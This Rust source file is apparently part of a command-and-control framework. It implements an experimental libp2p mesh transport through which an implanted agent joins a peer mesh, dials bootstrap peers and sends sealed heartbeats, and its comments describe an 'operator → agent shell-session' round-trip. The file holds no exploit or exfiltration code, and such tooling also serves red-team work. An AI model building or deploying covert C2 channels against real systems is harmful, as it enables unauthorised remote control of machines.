//! `MeshTransport` — **experimental** libp2p mesh transport (v1.1).
//!
//! Spawns a `nexus_mesh::MeshNode`, subscribes to its own agent-inbox topic
//! and the heartbeat topic, publishes a sealed `Heartbeat`-style envelope
//! every 30s. The full operator → agent shell-session round-trip over mesh
//! requires server-side mesh wiring on the C2 (v1.2 work).

use std::time::Duration;

use anyhow::{Context, Result};
use async_trait::async_trait;
use libp2p::Multiaddr;
use nexus_common::{NodeIdentity, SealedEnvelope};
use nexus_mesh::{topics, MeshEvent, MeshHandle, MeshNode};
use nexus_web_comms::{ShutdownFuture, Transport, TransportContext, TransportKind};
use tracing::{debug, info, warn};

/// Mesh-transport config.
#[derive(Debug, Clone)]
pub struct MeshTransport {
    /// libp2p multiaddr to bind on.
    pub listen: Multiaddr,
    /// Static bootstrap peers.
    pub bootstrap: Vec<Multiaddr>,
}

impl MeshTransport {
    /// Construct from raw strings.
    pub fn from_strs(listen: &str, bootstrap: &[String]) -> Result<Self> {
        let listen: Multiaddr = listen
            .parse()
            .with_context(|| format!("parse listen {listen:?}"))?;
        let bootstrap = bootstrap
            .iter()
            .map(|s| {
                s.parse::<Multiaddr>()
                    .with_context(|| format!("parse bootstrap {s:?}"))
            })
            .collect::<Result<Vec<_>>>()?;
        Ok(Self { listen, bootstrap })
    }
}

#[async_trait]
impl Transport for MeshTransport {
    fn kind(&self) -> TransportKind {
        TransportKind::Mesh
    }

    async fn run(self: Box<Self>, ctx: TransportContext, shutdown: ShutdownFuture) -> Result<()> {
        warn!(
            transport = %TransportKind::Mesh,
            "MeshTransport is EXPERIMENTAL — v1.1 has no server-side mesh wiring; \
             agent joins the mesh but operator commands won't reach it until v1.2"
        );

        let handle =
            MeshNode::spawn(&ctx.identity, self.listen.clone()).context("spawn mesh node")?;
        info!(peer = %handle.local_peer_id(), "mesh: node spawned");

        if let Some(addr) = wait_for_listen(&handle).await {
            info!(local = %addr, "mesh: bound");
        }

        let peer_id = ctx.identity.peer_id();
        handle
            .subscribe(&topics::agent_inbox(&peer_id))
            .await
            .context("subscribe agent inbox")?;
        handle
            .subscribe(&topics::heartbeat())
            .await
            .context("subscribe heartbeat")?;

        for addr in &self.bootstrap {
            if let Err(err) = handle.dial(addr.clone()).await {
                warn!(addr = %addr, error = %err, "mesh: bootstrap dial failed");
            }
        }

        let heartbeat_task = spawn_heartbeat(handle, ctx.identity);

        shutdown.await;
        heartbeat_task.abort();
        info!("mesh: shutdown requested; transport exiting");
        Ok(())
    }
}

async fn wait_for_listen(handle: &MeshHandle) -> Option<Multiaddr> {
    let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            return None;
        }
        match tokio::time::timeout(remaining, handle.next_event()).await {
            Ok(Some(MeshEvent::Listening(addr))) => return Some(addr),
            Ok(Some(_)) => continue,
            Ok(None) | Err(_) => return None,
        }
    }
}

fn spawn_heartbeat(handle: MeshHandle, identity: NodeIdentity) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(30));
        let server_topic = topics::server_inbox();
        if let Err(err) = handle.subscribe(&server_topic).await {
            warn!(error = %err, "mesh: subscribe server-inbox failed");
            return;
        }
        loop {
            interval.tick().await;
            let plaintext = b"heartbeat".to_vec();
            let env = match SealedEnvelope::seal(&identity, &identity.x25519_public(), &plaintext) {
                Ok(e) => e,
                Err(err) => {
                    warn!(error = %err, "mesh: heartbeat seal failed");
                    continue;
                }
            };
            let wire = match env.to_bincode() {
                Ok(b) => b,
                Err(err) => {
                    warn!(error = %err, "mesh: heartbeat encode failed");
                    continue;
                }
            };
            match handle.publish(&server_topic, wire).await {
                Ok(_) => debug!("mesh: heartbeat published"),
                Err(err) => {
                    debug!(error = %err, "mesh: heartbeat publish (no subscribers expected in v1.1)")
                }
            }
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn from_strs_parses_valid_addresses() {
        let t = MeshTransport::from_strs(
            "/ip4/127.0.0.1/tcp/0",
            &["/ip4/10.0.0.1/tcp/9100".to_string()],
        )
        .expect("ok");
        assert_eq!(t.bootstrap.len(), 1);
    }

    #[test]
    fn from_strs_rejects_bad_listen() {
        MeshTransport::from_strs("not-a-multiaddr", &[]).expect_err("must fail");
    }
}
